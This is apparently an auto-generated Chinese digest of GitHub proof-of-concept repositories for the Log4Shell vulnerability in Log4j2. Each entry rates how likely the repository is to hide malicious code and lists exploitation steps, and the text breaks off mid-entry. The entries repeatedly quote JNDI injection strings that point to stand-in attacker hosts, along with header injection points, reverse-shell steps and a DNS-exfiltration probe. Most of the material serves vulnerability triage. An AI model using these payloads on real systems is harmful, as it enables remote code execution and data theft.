PoC代码本身的主要目的是验证漏洞的存在，但存在一定的投毒风险。虽然PoC中执行的恶意代码通常是用于验证目的，例如回连攻击者的服务器，但如果攻击者篡改这些PoC，可以将payload替换为更具破坏性的恶意代码，比如植入后门、窃取敏感信息或进行拒绝服务攻击。由于PoC文件来自未经审核的第三方源，存在作者在payload中植入恶意代码的可能性。因此，在使用这些PoC时，需要仔细审查代码，确保其安全性。

风险评估：
* 代码结构和目标：PoC文件结构清晰，目标明确，针对已知漏洞利用。恶意行为的风险较低，因为代码的目的是为了复现漏洞，而不是隐藏恶意功能。
* 外部依赖：几乎没有外部依赖项，降低了引入恶意代码的可能性。
* 权限要求：这些 PoC 需要具有执行网络请求的权限，这增加了潜在的风险，因为它们可能被用来发起对内部网络的攻击或数据泄露。
* 代码审查：代码可读性高，易于审查。这意味着可以相对容易地识别和删除任何潜在的恶意代码。

综合以上因素，我给出的投毒风险是 10%。

**利用方式：**
1.  **确定目标系统：** 找到使用存在漏洞的Log4j2版本的应用程序。
2.  **构造恶意Payload：**  构建包含JNDI注入的Payload，例如`${jndi:ldap://attacker.com/evil}`。其中`attacker.com`是攻击者控制的服务器，`evil`是LDAP服务器上的恶意代码。
3.  **发送Payload：** 将Payload插入到应用程序的日志消息中。这可以通过多种方式实现，例如：
    *   HTTP请求头（User-Agent, X-Forwarded-For等）
    *   POST请求参数
    *   URL参数
    *   任何可能被应用程序记录的输入
4.  **利用JNDI执行恶意代码：**  当Log4j2记录包含Payload的消息时，会尝试通过JNDI从`attacker.com`下载并执行恶意代码。
5.  **反向shell获取权限：**  恶意代码通常会启动一个反向shell，允许攻击者远程控制目标系统。

提供的PoC代码针对特定应用（Druid, JSPWiki, CAS, Code42, Elasticsearch）的特定URI或HTTP头构造包含恶意JNDI字符串的请求，如果目标应用存在漏洞，且使用Log4j2记录相关请求信息，则可触发漏洞，实现远程代码执行。

**项目地址:** [sec13b/CVE-2021-44228-POC](https://github.com/sec13b/CVE-2021-44228-POC)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #36

**来源**: [CVE-2021-44228-srcporter_CVE-2021-44228.md](../2021/CVE-2021-44228-srcporter_CVE-2021-44228.md)

## CVE-2021-44228-Log4Shell

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 2.0-beta9 到 2.15.0（不包括安全版本 2.12.2、2.12.3 和 2.3.1）

**利用条件:** 需要目标系统使用受影响版本的 Log4j2，且允许 JNDI 查找

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 漏洞存在于 Apache Log4j2 中，由于 JNDI 功能未对攻击者控制的 LDAP 和其他 JNDI 相关端点进行保护。攻击者可以通过控制日志消息或日志消息参数，在启用了消息查找替换的情况下，执行从 LDAP 服务器加载的任意代码。

**有效性：** 根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，该漏洞是有效的。 搜索引擎结果显示了许多关于此漏洞的分析、利用和缓解措施的讨论。提供的 Dockerfile 和构建脚本表明可以构建一个包含漏洞的应用程序。

**利用方式：**

1.  攻击者将恶意 JNDI 查找字符串注入到应用程序的日志消息中。例如，通过 HTTP 请求的 User-Agent 头部或 POST 请求的参数。
2.  Log4j2 尝试解析日志消息，遇到 JNDI 查找字符串，例如 `${jndi:ldap://attacker.com/evil}`。
3.  Log4j2 通过 JNDI 连接到攻击者控制的 LDAP 服务器 (attacker.com)。
4.  LDAP 服务器返回一个包含恶意 Java 类的 URL。
5.  Log4j2 下载并执行该恶意 Java 类，从而导致远程代码执行。

**投毒风险：**提供的代码库旨在创建一个包含 Log4Shell 漏洞的示例应用程序，用于安全测试。虽然代码本身直接显示了漏洞的存在，但仍然存在一些轻微的投毒风险，主要集中在以下几点：

*   **依赖项混淆:** 恶意修改`pom.xml`或其他构建脚本,引入包含恶意代码的其他依赖项。
*   **构建脚本后门:** 在`build.sh`或Dockerfile中添加额外的命令,在构建过程中植入后门。
*   **ClassLoader Manipulation:** 理论上，可以修改应用程序的类加载器，动态加载和执行恶意代码，但这需要对Java内部机制有深入的了解，并且更难检测。
    
    考虑到这些风险，我认为此代码库存在约10%的投毒风险，因为即使是示例代码也可能被用于传播恶意负载。

**项目地址:** [srcporter/CVE-2021-44228](https://github.com/srcporter/CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #37

**来源**: [CVE-2021-44228-tadash10_Exploiting-CVE-2021-44228-Log4Shell-in-a-Banking-Environment.md](../2021/CVE-2021-44228-tadash10_Exploiting-CVE-2021-44228-Log4Shell-in-a-Banking-Environment.md)

## CVE-2021-44228 - Apache Log4j2 Log4Shell 远程代码执行漏洞

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行、数据泄露和服务器完全控制

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用了受影响版本的 Log4j2 并且允许 JNDI 查找，攻击者能够控制 Log4j2 记录的日志消息或日志消息参数。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j2 中的一个严重漏洞，攻击者可以通过注入恶意的 JNDI 查找字符串到日志消息中，利用此漏洞执行任意代码。漏洞原理是 Log4j2 允许在日志消息中使用 JNDI 查找功能，如果启用了消息查找功能，攻击者可以控制日志消息或日志消息参数，从而导致从 LDAP 服务器加载并执行任意代码。

**漏洞利用方式：**

1.  **攻击者构造恶意请求：** 攻击者发送包含特定格式的字符串的请求，例如 `${jndi:ldap://attacker.com/evil}`，这个字符串会被记录到 Log4j2 的日志中。
2.  **Log4j2 解析 JNDI 字符串：** 当 Log4j2 尝试记录包含 `${jndi:ldap://attacker.com/evil}` 的消息时，它会尝试解析 JNDI 字符串。
3.  **JNDI 查找：** Log4j2 通过 JNDI 接口连接到攻击者控制的 LDAP 服务器 `attacker.com`。
4.  **加载恶意代码：** LDAP 服务器返回一个包含恶意 Java 类的引用。
5.  **执行任意代码：** Log4j2 加载并执行该恶意 Java 类，从而导致远程代码执行。

**有效性：**
根据漏洞描述和搜索引擎结果，该漏洞的POC代码有效，可以实现远程代码执行。

**投毒风险：**
该漏洞利用代码存在一定的投毒风险。提供的`README.md`文件描述了利用过程，但其中包含的payload (Socket appender) 有可能被用于数据窃取。尽管主要目的是演示RCE，但通过`SerializedLayout`将日志事件发送到攻击者服务器，实际上意味着任何被记录的数据（包括潜在的敏感信息）都可能被泄露。因此，存在一定风险。

**风险评估依据：**
提供的POC专注于建立Socket连接并将序列化的数据发送到远程服务器，这意味着它可以用来构建一个后门，泄露信息或者植入更深层次的恶意代码。

**综上所述，虽然POC的目的是演示Log4Shell漏洞，但其中利用Socket appender 和 SerializedLayout的行为,存在潜在的投毒行为，因此投毒风险不容忽视。**

**项目地址:** [tadash10/Exploiting-CVE-2021-44228-Log4Shell-in-a-Banking-Environment](https://github.com/tadash10/Exploiting-CVE-2021-44228-Log4Shell-in-a-Banking-Environment)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #38

**来源**: [CVE-2021-44228-thomaspatzke_Log4Pot.md](../2021/CVE-2021-44228-thomaspatzke_Log4Pot.md)

## CVE-2021-44228 - Apache Log4j2 Log4Shell 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 极其高危，可导致完全控制受影响的系统

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 应用程序必须使用受影响的 Log4j2 版本，且允许攻击者控制记录的日志消息或日志消息参数。JNDI lookup substitution 必须启用 (2.15.0 之前默认启用)。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-44228，也被称为 Log4Shell，是一个存在于 Apache Log4j2 中的远程代码执行漏洞。该漏洞源于 Log4j2 允许在日志消息中使用 JNDI (Java Naming and Directory Interface) 查询。当 Log4j2 尝试解析包含特定格式字符串（例如 `${jndi:ldap://attacker.com/evil}`）的日志消息时，它会尝试通过 JNDI 从指定的 LDAP 服务器检索并执行恶意代码。

**有效性：**
根据漏洞库信息、搜索结果和漏洞利用的广泛性，此漏洞的 POC 代码非常有效。

**投毒风险：**
提供的“漏洞利用代码”仅仅是一个 GNU GPL 协议的 LICENSE 文件，本身不包含任何可执行的代码或恶意指令。因此，基于这份文件，投毒风险为 0%。

**利用方式：**
1.  **攻击者注入恶意 JNDI 字符串：** 攻击者需要在应用程序能够记录的任何输入点注入包含 JNDI 查找的恶意字符串。这可能包括 HTTP 请求头（例如 `User-Agent`、`X-Forwarded-For`）、POST 请求参数、WebSocket 消息等。
2.  **Log4j2 记录日志：** 当应用程序使用 Log4j2 记录包含恶意 JNDI 字符串的日志消息时，Log4j2 会尝试解析该字符串。
3.  **JNDI 查找：** Log4j2 会触发 JNDI 查找，尝试连接到攻击者控制的 LDAP 或其他 JNDI 相关服务器。
4.  **远程代码执行：** 攻击者的 JNDI 服务器会返回一个包含恶意 Java 类的响应。Log4j2 会加载并执行该 Java 类，导致远程代码执行。攻击者可以利用此漏洞在目标系统上执行任意命令。

**缓解措施：**
*   升级到 Log4j2 的修复版本（2.16.0 或更高版本，或者 2.12.2、2.12.3 或 2.3.1）。
*   如果无法升级，可以设置 `log4j2.formatMsgNoLookups` 为 `true` 来禁用消息查找，或者删除 `JndiLookup` 类。

综上所述，CVE-2021-44228 是一个极其严重的安全漏洞，利用方式简单，影响范围广泛，需要立即进行修复。

**项目地址:** [thomaspatzke/Log4Pot](https://github.com/thomaspatzke/Log4Pot)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #39

**来源**: [CVE-2021-44228-winnpixie_log4noshell.md](../2021/CVE-2021-44228-winnpixie_log4noshell.md)

## CVE-2021-44228 Log4Shell

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 严重，未经身份验证的远程代码执行

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 应用程序使用受影响的 Log4j2 版本，且允许记录用户可控的数据。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j2 中的一个严重漏洞，它允许未经身份验证的攻击者执行远程代码。攻击者可以通过将恶意 JNDI 注入字符串插入到 Log4j2 记录的日志消息中来利用此漏洞。当 Log4j2 尝试解析此字符串时，它会向攻击者控制的 LDAP 或其他 JNDI 端点发起请求，从而允许攻击者执行任意代码。

**有效性：**

根据漏洞库信息和搜索结果，此漏洞的 POC 代码非常有效。大量的安全厂商和研究人员都确认了此漏洞的存在和可利用性。提供的“Log4NoShell”代码实际上是一个缓解工具，通过禁用 Log4j2 的 JNDI 查找来防止漏洞被利用。它本身不是exploit，而是防御手段。

**投毒风险：**

分析提供的缓解工具代码，该代码主要功能是通过Java Agent禁用Log4j的JNDI lookup功能，本身不存在恶意代码。但是，任何第三方提供的工具都存在潜在的投毒风险。代码中使用了 ASM 字节码操作库，有一定的复杂性，增加了审查的难度。 因此，尽管表面上是防御工具，仍然存在一定的风险，建议在使用前仔细审查代码。

 风险评估：5%。

**利用方式：**

1.  攻击者识别使用易受攻击的 Log4j2 版本的应用程序。
2.  攻击者将包含恶意 JNDI 注入字符串（例如 `${jndi:ldap://attacker.com/evil}`）的输入发送到应用程序，确保该输入会被 Log4j2 记录下来。输入的途径包括但不限于：HTTP头（User-Agent, X-Forwarded-For等），POST请求体，URL参数等
3.  Log4j2 尝试解析该字符串，并向攻击者控制的 LDAP 服务器发起请求。
4.  攻击者的 LDAP 服务器返回一个包含恶意 Java 类的响应。
5.  Log4j2 加载并执行该恶意 Java 类，从而允许攻击者执行任意代码。

**项目地址:** [winnpixie/log4noshell](https://github.com/winnpixie/log4noshell)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #40

**来源**: [CVE-2021-44228-x1ongsec_CVE-2021-44228-Log4j-JNDI.md](../2021/CVE-2021-44228-x1ongsec_CVE-2021-44228-Log4j-JNDI.md)

## CVE-2021-44228-Log4Shell

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行和完全系统控制

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用了受影响的Log4j2版本，且允许外部JNDI查找

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是一个存在于 Apache Log4j2 中的严重远程代码执行漏洞。攻击者可以通过控制日志消息或日志消息参数，利用 JNDI 功能执行从 LDAP 服务器加载的任意代码。该漏洞利用 JNDI 注入，攻击者将包含恶意 JNDI 查找的字符串发送到应用程序，Log4j2 解析并执行该字符串，从而导致远程代码执行。

**有效性：**
提供的POC代码有效。它展示了如何使用 JNDI 注入漏洞利用 Log4j2。该代码提供了一个简单的 Spring Boot 应用程序，用于触发漏洞，并提供了一个利用有效载荷的示例。

**投毒风险：**
此仓库中作者隐藏投毒代码的风险较低。`README.md` 中提示的payload执行的是打开计算器程序的操作，虽然不是恶意操作，但仍需警惕。另外，`pom.xml` 文件声明依赖了 `log4j-api` 和 `log4j-core` 2.14.1版本，这是一个受漏洞影响的版本，为复现漏洞提供环境。`VulController.java` 中定义了触发漏洞的端点 `/vul`，并使用 `log.info` 记录请求参数。这个简单的应用程序本身不包含任何隐藏的恶意代码，仓库目的是复现CVE-2021-44228。 但无法完全排除作者添加了不易察觉的后门的可能。风险评估为 10%。

**利用方式：**
利用方式如下：
1.  攻击者找到一个使用了 Log4j2 且允许外部 JNDI 查找的应用程序。
2.  攻击者将一个包含恶意 JNDI 查找的字符串（例如 `${jndi:ldap://your_ip:port/xxx}`）注入到应用程序可以记录的任何输入字段（例如 HTTP Header、POST 参数等）。
3.  当 Log4j2 尝试记录该字符串时，它会解析 JNDI 查找，并尝试连接到攻击者控制的 LDAP 服务器。
4.  攻击者的 LDAP 服务器返回一个包含恶意 Java 类的响应。
5.  Log4j2 加载并执行该恶意 Java 类，从而导致远程代码执行。

**项目地址:** [x1ongsec/CVE-2021-44228-Log4j-JNDI](https://github.com/x1ongsec/CVE-2021-44228-Log4j-JNDI)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #41

**来源**: [CVE-2021-44228-yadavmukesh_Log4Shell-vulnerability-CVE-2021-44228-.md](../2021/CVE-2021-44228-yadavmukesh_Log4Shell-vulnerability-CVE-2021-44228-.md)

## CVE-2021-44228-Log4Shell

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，允许攻击者完全控制受影响的系统

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2、2.12.3 和 2.3.1)

**利用条件:** 目标系统使用了受影响版本的 Log4j2，且允许消息查找替换。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j2 中的一个严重漏洞，攻击者可以通过控制日志消息或日志消息参数，从 LDAP 服务器加载并执行任意代码。漏洞利用方式是向服务器发送包含特定格式的 JNDI 注入payload的请求，例如 `${jndi:ldap://malicious-server.com/exploit}`。如果 Log4j2 记录了该请求，它会尝试解析该字符串，从而触发 JNDI 查找并从恶意服务器下载和执行代码。

**有效性：**
根据漏洞信息和搜索结果，该漏洞被广泛利用，POC代码有效。Unit 42、NVD、CrowdStrike、Sysdig、Oracle 等多个安全机构都发布了关于该漏洞的分析和缓解措施，证明了其真实性和危害性。

**投毒风险：**
提供的代码仓库主要侧重于使用机器学习方法检测Log4Shell攻击，而非直接的漏洞利用。尽管仓库中包含用于训练模型的日志数据和Python脚本，这些组件本身不太可能直接包含投毒代码。

风险在于：
1.  **数据污染：** 训练数据中可能包含精心构造的、旨在降低检测模型准确性的恶意日志条目（例如，通过添加混淆或规避技术），占比约5%。
2.  **依赖项风险：** `requirements.txt` 中列出的某些依赖项可能存在安全漏洞，但这不是作者的有意投毒。

总体而言，此代码仓库的投毒风险较低，约5%。

**利用方式：**
1.  攻击者将恶意 JNDI 注入 payload 插入到应用程序的日志消息中，例如通过 HTTP 请求头、POST 数据或其他用户可控的输入。
2.  如果应用程序使用存在漏洞的 Log4j2 版本记录此消息，Log4j2 会尝试解析 JNDI 字符串。
3.  Log4j2 触发 JNDI 查找，连接到攻击者控制的 LDAP 或 RMI 服务器。
4.  恶意服务器返回一个包含 Java 类的响应，该类包含攻击者想要执行的恶意代码。
5.  Log4j2 加载并执行该 Java 类，从而允许攻击者在目标系统上执行任意代码。

**缓解措施：**
*   升级 Log4j2 到 2.17.0 或更高版本。
*   禁用 JNDI 查找。
*   配置防火墙规则以阻止出站 LDAP 和 RMI 连接。

**项目地址:** [yadavmukesh/Log4Shell-vulnerability-CVE-2021-44228-](https://github.com/yadavmukesh/Log4Shell-vulnerability-CVE-2021-44228-)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---



---

## POC #16

**来源**: [CVE-2021-44228-Tai-e_CVE-2021-44228.md](../2021/CVE-2021-44228-Tai-e_CVE-2021-44228.md)

## CVE-2021-44228-Apache Log4j2-远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 2.0-beta9 到 2.15.0（不包括安全版本 2.12.2、2.12.3 和 2.3.1）

**利用条件:** 需要目标系统使用受影响的 Log4j2 版本，且允许JNDI 查找。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，又称Log4Shell，是Apache Log4j2中的一个严重漏洞。攻击者可以通过控制日志消息或日志消息参数，利用 JNDI 注入执行任意代码。漏洞利用方式通常涉及在日志消息中插入包含恶意 JNDI 查找的字符串，例如 `${jndi:ldap://attacker.com/evil}`。当 Log4j2 处理此消息时，它会尝试通过 LDAP 从攻击者控制的服务器检索并执行代码。\n\n提供的漏洞利用代码是一个使用 Tai-e 静态分析工具来检测 Log4Shell 漏洞及其触发路径的项目。该项目本身不包含恶意代码，其目的是帮助安全研究人员和开发人员识别和修复受此漏洞影响的应用程序。但是，任何下载和使用漏洞利用代码的行为都存在一定的风险，因为可能存在其他未知的安全问题或依赖项。该项目使用了gradlew脚本，理论上存在一定的投毒风险，可能在编译的时候执行恶意代码，但从代码内容来看，直接投毒的可能性较低。主要风险在于构建脚本依赖的第三方库可能被篡改，导致潜在的供应链攻击。

根据漏洞库信息、搜索结果和漏洞利用代码，该漏洞的利用非常有效，影响广泛。需要尽快修复。


**项目地址:** [Tai-e/CVE-2021-44228](https://github.com/Tai-e/CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #17

**来源**: [CVE-2021-44228-YangHyperData_LOGJ4_PocShell_CVE-2021-44228.md](../2021/CVE-2021-44228-YangHyperData_LOGJ4_PocShell_CVE-2021-44228.md)

## CVE-2021-44228 - Apache Log4j2 JNDI 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 极高危，可能导致完全控制受影响系统

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3 和 2.3.1)

**利用条件:** 目标系统使用受影响的 Log4j2 版本，并且允许出站网络连接访问攻击者控制的 LDAP 或其他 JNDI 端点。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是一个严重的远程代码执行漏洞，存在于 Apache Log4j2 中。攻击者可以通过发送特制的日志消息，利用 JNDI 注入漏洞，从恶意 LDAP 服务器加载并执行任意代码。

**有效性：**
提供的 POC 代码是有效的，它演示了如何利用此漏洞。它包含一个 Dockerfile，用于构建包含漏洞的 Tomcat 应用，以及一个 Python 脚本，用于自动化漏洞利用过程，包括设置恶意的 LDAP 服务器和 HTTP 服务器，并生成 Payload。

**投毒风险：**
尽管该存储库旨在作为概念验证，但仍存在一定的投毒风险。 虽然代码本身没有明显的恶意功能，但它简化了漏洞利用，这可能会增加被不道德行为者利用的风险。`poc.py` 脚本中的部分代码存在可疑行为，比如 Java 代码的字符串拼接，以及 `Proc` 类的调用，这些地方有可能隐藏恶意指令。 因此，投毒风险评估为 10%。使用此 PoC 时应采取预防措施，例如在隔离环境中进行。

**利用方式：**
1.  攻击者发送包含 JNDI 查找字符串（例如 `${jndi:ldap://attacker.com/evil}`）的特制日志消息。该字符串会被 Log4j2 解析。
2.  Log4j2 尝试通过 JNDI 连接到攻击者控制的 LDAP 服务器。
3.  LDAP 服务器响应，并返回一个 Java 类的 URL。
4.  Log4j2 下载并执行该 Java 类，从而允许攻击者在目标系统上执行任意代码。

该 POC 仓库提供了一个 Dockerfile 用来构建一个有漏洞的web应用，以及一个 Python 脚本，它模拟了攻击者的 LDAP 服务器和 Payload 生成器，并自动化了利用过程。攻击者需要监听一个端口来接受反向shell连接。 使用方法是在目标服务存在漏洞的地方插入恶意的 JNDI 字符串。

**项目地址:** [YangHyperData/LOGJ4_PocShell_CVE-2021-44228](https://github.com/YangHyperData/LOGJ4_PocShell_CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #18

**来源**: [CVE-2021-44228-ZacharyZcR_CVE-2021-44228.md](../2021/CVE-2021-44228-ZacharyZcR_CVE-2021-44228.md)

## CVE-2021-44228-Apache Log4j2-JNDI注入

**漏洞编号:** CVE-2021-44228

**漏洞类型:** JNDI注入

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 2.0-beta9 to 2.15.0 (不包括安全版本 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 目标应用程序使用受影响的Log4j2版本，并且允许消息查找替换

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j2 中的一个严重漏洞，它允许未经身份验证的远程代码执行。攻击者可以通过将恶意的 JNDI 查找字符串注入到 Log4j2 可以记录的任何输入中来利用此漏洞。当 Log4j2 尝试解析并执行该 JNDI 查找时，它可能会从攻击者控制的 LDAP 或其他 JNDI 相关端点加载任意代码。

**有效性：**
提供的 PoC 代码是有效的。它使用 `${jndi:dns://${sys:java.version}.z72ouf.dnslog.cn}` 格式的 JNDI 注入，该注入会触发 DNS 查询到 `z72ouf.dnslog.cn`，从而验证漏洞是否已成功利用。 `${sys:java.version}` 获取Java版本号。

**投毒风险：**
此仓库中不太可能存在作者隐藏的投毒代码（0%）。提供的文件看起来直接针对演示和利用 CVE-2021-44228 漏洞。 `pom.xml` 文件定义了 log4j-core 和 log4j-api 的依赖项。`log4j2.xml` 文件配置了基本的日志记录。 `CVE202144228.java` 文件包含利用该漏洞的有效负载，该负载会生成 DNS 查询以进行验证。 由于该PoC的主要作用是为了验证漏洞，而非植入后门，因此认为投毒风险低。

**利用方式：**
1.  攻击者找到应用程序中记录用户可控输入的位置。 这些位置可能包括 HTTP header，POST 数据，GET 参数等，总之，所有程序日志可以记录的地方。
2.  攻击者将恶意 JNDI 查找字符串（例如`${jndi:ldap://attacker.com/Exploit}`）注入到此输入中。
3.  当应用程序记录此输入时，Log4j2 会尝试解析 JNDI 查找。
4.  Log4j2 会连接到攻击者控制的 LDAP 服务器（或其他的 JNDI 服务）。
5.  攻击者的 LDAP 服务器返回一个包含恶意 Java 类的响应。
6.  Log4j2 加载并执行此恶意 Java 类，从而允许攻击者在目标系统上执行任意代码。
7. 缓解措施包括升级 Log4j2 到 >=2.17.0 版本，禁用 JNDI 查找，或设置 `log4j2.formatMsgNoLookups=true`。


**项目地址:** [ZacharyZcR/CVE-2021-44228](https://github.com/ZacharyZcR/CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #19

**来源**: [CVE-2021-44228-arabindadora_log4shell.md](../2021/CVE-2021-44228-arabindadora_log4shell.md)

## CVE-2021-44228 Log4Shell RCE

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 严重，允许未经身份验证的远程代码执行

**影响版本:** <= 2.14.1 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 应用程序使用受影响的Log4j版本，并且允许记录用户可控的输入，同时启用消息查找替换。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，也被称为Log4Shell，是一个存在于Apache Log4j2中的严重漏洞。该漏洞允许攻击者通过向日志消息或日志消息参数中注入恶意JNDI查找字符串，例如`${jndi:ldap://attacker.com/a}`，来执行任意代码。当Log4j2处理包含该字符串的日志消息时，它会尝试通过JNDI从攻击者控制的LDAP服务器检索Java对象。如果JVM配置允许，该对象将被反序列化并执行，从而导致远程代码执行。

**利用方式：**
1.  攻击者识别使用Log4j2且记录用户可控输入的应用程序。
2.  攻击者构造包含恶意JNDI查找的payload，并将其注入到应用程序可以记录的任何输入字段中（例如，HTTP头、表单参数等）。
3.  当应用程序记录包含恶意payload的输入时，Log4j2会尝试解析JNDI查找。
4.  Log4j2向攻击者控制的LDAP服务器发出请求。
5.  攻击者的LDAP服务器返回一个指向恶意Java类的引用。
6.  应用程序下载并执行恶意Java类，从而允许攻击者在目标系统上执行任意代码。

**评估POC代码：**
提供的PoC代码包含一个Dockerfile和Makefile，用于演示和利用CVE-2021-44228漏洞。Makefile包含用于构建Docker容器、启动/停止应用程序、触发漏洞利用和修补受害者应用程序的命令。`make exploit` 命令使用curl发送一个包含恶意JNDI payload的HTTP请求，该payload的目标是`${jndi:ldap://$(LHOST):$(LPORT)/a}`。该代码有效演示了漏洞利用。

**投毒风险：**
虽然PoC代码本身旨在演示和利用该漏洞，但任何从不受信任的来源下载的代码都存在潜在的风险。在本例中，投毒风险较低（约为10%），因为代码相对简单且易于审查。需要注意的是，Makefile的`exploit`命令和docker-compose.yml 中涉及的镜像如果被篡改，可能会引入恶意行为。用户应仔细检查所有代码，尤其是与网络连接和代码执行相关的部分，然后再执行PoC。代码中提供的Exploit.class ，本身就是一个后门代码,务必不要把POC验证的后门代码判定为投毒代码。docker-compose.yml 中涉及的镜像需要人工review.

**项目地址:** [arabindadora/log4shell](https://github.com/arabindadora/log4shell)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #20

**来源**: [CVE-2021-44228-asd58584388_CVE-2021-44228.md](../2021/CVE-2021-44228-asd58584388_CVE-2021-44228.md)

## CVE-2021-44228 Apache Log4j2 Log4Shell 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 应用程序使用受影响的Log4j2版本，允许记录用户可控的输入，且启用了message lookup substitution。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，也被称为Log4Shell，是Apache Log4j2中的一个严重漏洞。攻击者通过发送包含特定格式的恶意字符串（例如`${jndi:ldap://attacker.com/exploit}`）到应用程序，如果应用程序使用Log4j2记录该字符串，则Log4j2会尝试通过JNDI从攻击者控制的LDAP服务器检索恶意代码，并执行该代码。

**有效性：**
根据提供的漏洞信息、搜索结果和漏洞利用代码，此漏洞的POC代码是有效的。大量报告表明该漏洞已被广泛利用。

**投毒风险：**
提供的漏洞利用代码存储库主要包含漏洞分析和利用说明，以及用于设置LDAP和HTTP服务器的示例。`README.md`详细解释了漏洞的利用过程，并提供了相关的图片说明。`LICENSE`文件表明作者声明了代码的版权和使用许可。`marshalsec`目录可能包含利用所需的工具或者payload。总体来看，该仓库主要目的是为了分析和演示该漏洞，而非恶意投毒。但由于代码包含执行恶意代码的步骤，因此存在一定风险。我判断投毒的可能性是10%。因为`marshalsec`工具本身具备一定的攻击性，如果用户不熟悉该工具，可能会被误导或者滥用。

**利用方式：**
1.  攻击者构造包含JNDI查找的恶意请求字符串，例如 `${jndi:ldap://evil.com/a}`。
2.  应用程序使用存在漏洞的Log4j2版本记录此字符串。
3.  Log4j2解析字符串，发起JNDI请求到攻击者控制的LDAP服务器 `evil.com`。
4.  LDAP服务器返回一个指向恶意Java类的URL。
5.  Log4j2加载并执行该恶意Java类，导致远程代码执行。
6.  攻击者可以在目标服务器上执行任意命令。

**项目地址:** [asd58584388/CVE-2021-44228](https://github.com/asd58584388/CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #21

**来源**: [CVE-2021-44228-axisops_CVE-2021-44228.md](../2021/CVE-2021-44228-axisops_CVE-2021-44228.md)

## CVE-2021-44228-Apache Log4j2 JNDI 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行

